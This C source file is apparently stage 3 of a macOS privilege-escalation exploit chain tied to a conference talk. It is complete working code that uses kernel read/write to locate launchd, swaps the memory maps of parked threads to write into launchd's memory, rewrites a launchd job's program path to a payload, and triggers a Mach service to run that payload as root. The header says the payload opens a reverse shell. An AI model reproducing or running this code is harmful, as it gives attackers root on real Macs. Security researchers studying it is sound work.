/*
 * root.c -- stage-3 privilege escalation (Black Hat USA 2026,
 * Blazakis/Calif; macOS 26.4.1 / 25E253).
 *
 * With the stage-2 kernel R/W in hand:
 *   1. slide = A.inp_pcbinfo - _ripcbinfo (done by krw_redirect)
 *   2. walk _kernproc: find launchd (pid 1) and our own process
 *   3. park two worker threads: one blocked in read() on an empty pipe,
 *      one blocked in write() on a full pipe.  copyin/copyout use
 *      current_thread()->map -- swap the parked thread's map
 *      (thread + 0x418) for launchd's task map (task + 0x28) and the
 *      pipe op lands in launchd's address space: cross-process R/W.
 *   4. walk launchd's vm_map entries (vm_map + 0x18, links next/start/end
 *      at +0/+0x10/+0x18), scan for the launchd job's Program string
 *      "/usr/bin/setregion" and overwrite it with our payload path
 *      (fits: payload path must be <= 18 chars).
 *   5. poke the on-demand mach service so launchd runs the payload as
 *      root.  The payload is a #!/bin/sh script (shebang execution is not
 *      subject to the AMFI launch constraints that block direct Mach-O
 *      tampering) and opens the reverse shell.
 *   6. restore thread maps; krw_close() repairs the inpcb side effects.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <xpc/xpc.h>

#include "offsets.h"
#include "krw.h"

#define NEEDLE          "/usr/bin/setregion"
#define NEEDLE_LEN      18              /* not counting NUL */
#define PAYLOAD_MAX     NEEDLE_LEN      /* must fit in place */
#define PROOF_FILE      "/tmp/lpe-root-proof.txt"

#define RW_CHUNK        16384           /* one arm64 page per pipe op */
#define MAX_VME_SIZE    (64UL * 1024 * 1024)
#define MAX_VME_COUNT   65536

/* ------------------------------------------------------------------ */
/* parked worker threads                                               */
/* ------------------------------------------------------------------ */

enum { OP_NONE = 0, OP_READ_LAUNCHD = 1, OP_WRITE_LAUNCHD = 2 };

typedef struct {
    pthread_t       th;
    uint64_t        tid;        /* kernel thread_id (pthread_threadid_np) */
    uint64_t        kaddr;      /* kernel address of struct thread */
    int             rfd, wfd;   /* pipe */
    /* op mailbox (volatile: no syscalls allowed while map is swapped) */
    volatile int    go;
    volatile int    done;
    volatile int    restored;
    int             op;
    void           *va;
    size_t          len;
    volatile ssize_t result;
} park_t;

static park_t g_reader, g_writer;

static void *
reader_main(void *arg)
{
    park_t *p = arg;
    pthread_threadid_np(NULL, &p->tid);
    __sync_synchronize();
    for (;;) {
        while (!p->go)
            sched_yield();
        /* read() blocks: pipe kept empty between ops */
        p->result = read(p->rfd, p->va, p->len);
        __sync_synchronize();
        p->done = 1;
        __sync_synchronize();
        /* spin without syscalls until main restores our map */
        while (!p->restored)
            ;
        p->go = 0;
        p->done = 0;
        p->restored = 0;
        __sync_synchronize();
    }
    return NULL;
}

static void *
writer_main(void *arg)
{
    park_t *p = arg;
    pthread_threadid_np(NULL, &p->tid);
    __sync_synchronize();
    for (;;) {
        while (!p->go)
            sched_yield();
        /* write() blocks: pipe kept full between ops */
        p->result = write(p->wfd, p->va, p->len);
        __sync_synchronize();
        p->done = 1;
        __sync_synchronize();
        while (!p->restored)
            ;
        p->go = 0;
        p->done = 0;
        p->restored = 0;
        __sync_synchronize();
    }
    return NULL;
}

static int
park_setup(park_t *p, int reader)
{
    int fds[2];

    if (pipe(fds) != 0)
        return -1;
    p->rfd = fds[0];
    p->wfd = fds[1];
    if (pthread_create(&p->th, NULL, reader ? reader_main : writer_main,
                       p) != 0)
        return -1;
    /* wait for the thread id */
    while (p->tid == 0)
        sched_yield();

    if (reader) {
        /* leave the pipe empty so the worker blocks in read() */
    } else {
        /* fill the pipe so the worker blocks in write() */
        uint8_t zero[RW_CHUNK] = {0};
        int fl = fcntl(p->wfd, F_GETFL);
        fcntl(p->wfd, F_SETFL, fl | O_NONBLOCK);
        while (write(p->wfd, zero, sizeof(zero)) > 0)
            ;
        fcntl(p->wfd, F_SETFL, fl);
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* kernel R/W helpers on top of krw                                    */
/* ------------------------------------------------------------------ */

static uint64_t
find_proc_by_pid(krw_t *k, uint64_t kernproc, int pid)
{
    uint64_t proc = kernproc;
    int i;

    for (i = 0; i < 100000 && proc != 0; i++) {
        uint32_t p = krw_read32u(k, proc + PROC_OFF_PID);
        if (p == (uint32_t)pid)
            return proc;
        proc = krw_read64(k, proc + PROC_OFF_LIST_NEXT);
    }
    return 0;
}

static uint64_t
task_of_proc(krw_t *k, uint64_t proc)
{
    uint64_t ro = krw_read64(k, proc + PROC_OFF_RO);
    if (ro == 0)
        return 0;
    return krw_read64(k, ro + PROC_RO_OFF_TASK);
}

static uint64_t
find_thread(krw_t *k, uint64_t task, uint64_t tid)
{
    uint64_t head = task + TASK_OFF_THREADS;
    uint64_t q = krw_read64(k, head);
    int i;

    for (i = 0; i < 100000 && q != 0 && q != head; i++) {
        uint64_t thread = q - THREAD_OFF_TASK_THREADS;
        uint64_t t = krw_read64(k, thread + THREAD_OFF_THREAD_ID);
        if (t == tid)
            return thread;
        q = krw_read64(k, q);
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* cross-process R/W via the parked threads                            */
/* ------------------------------------------------------------------ */

static uint64_t g_launchd_map, g_our_map;

/* read launchd memory at va (len <= RW_CHUNK) via the writer parked on a
 * full pipe; returns bytes actually captured */
static ssize_t
launchd_read(krw_t *k, park_t *w, uint64_t va, void *out, size_t len)
{
    ssize_t got = 0;
    int fl;

    w->op = OP_READ_LAUNCHD;
    w->va = (void *)va;
    w->len = len;
    w->go = 1;
    __sync_synchronize();
    usleep(30 * 1000);              /* let the worker enter write() */

    if (krw_write64(k, w->kaddr + THREAD_OFF_MAP, g_launchd_map) != 0)
        return -1;

    /* drain: every byte we read frees space, the parked writer copyins
     * from launchd to fill it */
    fl = fcntl(w->rfd, F_GETFL);
    fcntl(w->rfd, F_SETFL, fl | O_NONBLOCK);
    while (!w->done) {
        ssize_t n = read(w->rfd, (uint8_t *)out + got, len - got);
        if (n > 0)
            got += n;
        else
            usleep(1000);
    }
    /* collect what remains in the pipe */
    for (;;) {
        ssize_t n = read(w->rfd, (uint8_t *)out + got, len - got);
        if (n <= 0)
            break;
        got += n;
    }
    fcntl(w->rfd, F_SETFL, fl);

    krw_write64(k, w->kaddr + THREAD_OFF_MAP, g_our_map);
    w->restored = 1;
    __sync_synchronize();

    if (w->result < 0 && got == 0)
        return -1;                  /* copyin faulted: unmapped page */

    /* refill the pipe for the next op */
    {
        uint8_t zero[RW_CHUNK] = {0};
        fcntl(w->wfd, F_SETFL, fl | O_NONBLOCK);
        while (write(w->wfd, zero, sizeof(zero)) > 0)
            ;
        fcntl(w->wfd, F_SETFL, fl);
    }
    return got;
}

/* write launchd memory at va via the reader parked on an empty pipe */
static int
launchd_write(krw_t *k, park_t *r, uint64_t va, const void *data, size_t len)
{
    int rc = -1;

    r->op = OP_WRITE_LAUNCHD;
    r->va = (void *)va;
    r->len = len;
    r->go = 1;
    __sync_synchronize();
    usleep(30 * 1000);              /* let the worker enter read() */

    if (krw_write64(k, r->kaddr + THREAD_OFF_MAP, g_launchd_map) != 0)
        goto out;

    if (write(r->wfd, data, len) == (ssize_t)len)
        rc = 0;

    while (!r->done)
        usleep(1000);
out:
    krw_write64(k, r->kaddr + THREAD_OFF_MAP, g_our_map);
    r->restored = 1;
    __sync_synchronize();
    return rc;
}

/* ------------------------------------------------------------------ */
/* launchd job overwrite + trigger                                     */
/* ------------------------------------------------------------------ */

static int
scan_and_overwrite(krw_t *k, uint64_t launchd_map, const char *payload)
{
    uint64_t hdr = launchd_map + VM_MAP_OFF_HDR;
    uint64_t entry = krw_read64(k, hdr + VME_OFF_NEXT);
    uint8_t *page = malloc(RW_CHUNK);
    int hits = 0, entries = 0;

    if (page == NULL)
        return -1;

    while (entry != 0 && entry != hdr && entries++ < MAX_VME_COUNT) {
        uint64_t start = krw_read64(k, entry + VME_OFF_START);
        uint64_t end = krw_read64(k, entry + VME_OFF_END);
        uint64_t next = krw_read64(k, entry + VME_OFF_NEXT);
        uint64_t va;

        if (end > start && end - start <= MAX_VME_SIZE &&
            start < 0x0000010000000000ULL) {   /* userspace */
            for (va = start; va + RW_CHUNK <= end; va += RW_CHUNK) {
                ssize_t n = launchd_read(k, &g_writer, va, page, RW_CHUNK);
                ssize_t off;
                if (n <= 0)
                    continue;
                for (off = 0; off + NEEDLE_LEN <= n; off++) {
                    if (memcmp(page + off, NEEDLE, NEEDLE_LEN) == 0 &&
                        page[off + NEEDLE_LEN] == 0) {
                        uint64_t where = va + off;
                        fprintf(stderr, "[root] found \"%s\" @ "
                                "launchd+0x%llx -> overwriting\n",
                                NEEDLE, (unsigned long long)where);
                        if (launchd_write(k, &g_reader, where, payload,
                                          strlen(payload) + 1) == 0)
                            hits++;
                        else
                            fprintf(stderr, "[root] write failed @ "
                                    "0x%llx\n", (unsigned long long)where);
                    }
                }
            }
        }
        entry = next;
    }
    free(page);
    fprintf(stderr, "[root] scanned %d vm entries, %d overwrite(s)\n",
            entries, hits);
    return hits > 0 ? 0 : -1;
}

static int
trigger_service(const char *name)
{
    xpc_connection_t conn =
        xpc_connection_create_mach_service(name,
                                           dispatch_get_global_queue(
                                               QOS_CLASS_DEFAULT, 0), 0);
    if (conn == NULL)
        return -1;
    xpc_connection_set_event_handler(conn, ^(xpc_object_t e) {
        (void)e;
    });
    xpc_connection_activate(conn);
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_connection_send_message(conn, msg);
    fprintf(stderr, "[root] poked mach service %s\n", name);
    return 0;
}

/* ------------------------------------------------------------------ */

int
root_stage(krw_t *k, const char *payload_path, const char *trigger_name)
{
    uint64_t slide = krw_slide(k);
    uint64_t kernproc, launchd_proc, our_proc;
    uint64_t launchd_task, our_task;
    struct stat st;
    int i;

    fprintf(stderr, "[root] slide 0x%llx\n", (unsigned long long)slide);

    if (strlen(payload_path) > PAYLOAD_MAX) {
        fprintf(stderr, "[root] payload path '%s' too long (%zu > %d) -- "
                "must fit over \"%s\"\n", payload_path,
                strlen(payload_path), PAYLOAD_MAX, NEEDLE);
        return -1;
    }

    /* locate launchd + ourselves */
    kernproc = krw_read64(k, XNU_KERNPROC + slide);
    fprintf(stderr, "[root] kernproc = 0x%llx\n",
            (unsigned long long)kernproc);
    if (kernproc == 0)
        return -1;

    launchd_proc = find_proc_by_pid(k, kernproc, 1);
    our_proc = find_proc_by_pid(k, kernproc, getpid());
    if (launchd_proc == 0 || our_proc == 0) {
        fprintf(stderr, "[root] proc walk failed (launchd %llx, us %llx)\n",
                (unsigned long long)launchd_proc,
                (unsigned long long)our_proc);
        return -1;
    }
    launchd_task = task_of_proc(k, launchd_proc);
    our_task = task_of_proc(k, our_proc);
    g_launchd_map = krw_read64(k, launchd_task + TASK_OFF_MAP);
    g_our_map = krw_read64(k, our_task + TASK_OFF_MAP);
    fprintf(stderr, "[root] launchd task 0x%llx map 0x%llx | our task "
            "0x%llx map 0x%llx\n",
            (unsigned long long)launchd_task,
            (unsigned long long)g_launchd_map,
            (unsigned long long)our_task,
            (unsigned long long)g_our_map);
    if (g_launchd_map == 0 || g_our_map == 0)
        return -1;

    /* park the two workers */
    if (park_setup(&g_reader, 1) != 0 || park_setup(&g_writer, 0) != 0) {
        fprintf(stderr, "[root] park setup failed\n");
        return -1;
    }
    g_reader.kaddr = find_thread(k, our_task, g_reader.tid);
    g_writer.kaddr = find_thread(k, our_task, g_writer.tid);
    fprintf(stderr, "[root] reader thread 0x%llx, writer thread 0x%llx\n",
            (unsigned long long)g_reader.kaddr,
            (unsigned long long)g_writer.kaddr);
    if (g_reader.kaddr == 0 || g_writer.kaddr == 0)
        return -1;

    unlink(PROOF_FILE);

    /* the big step: rewrite the launchd job's Program string */
    if (scan_and_overwrite(k, g_launchd_map, payload_path) != 0)
        return -1;

    /* fire the on-demand service: launchd execs our payload as root */
    if (trigger_service(trigger_name) != 0)
        return -1;

    for (i = 0; i < 100; i++) {
        if (stat(PROOF_FILE, &st) == 0 && st.st_size > 0) {
            char buf[256];
            int fd = open(PROOF_FILE, O_RDONLY);
            ssize_t n = fd >= 0 ? read(fd, buf, sizeof(buf) - 1) : 0;
            if (fd >= 0)
                close(fd);
            if (n > 0) {
                buf[n] = 0;
                fprintf(stderr, "[root] SUCCESS -- payload ran as:\n%s\n",
                        buf);
            }
            return 0;
        }
        usleep(100 * 1000);
    }
    fprintf(stderr, "[root] payload did not report back (no %s)\n",
            PROOF_FILE);
    return -1;
}
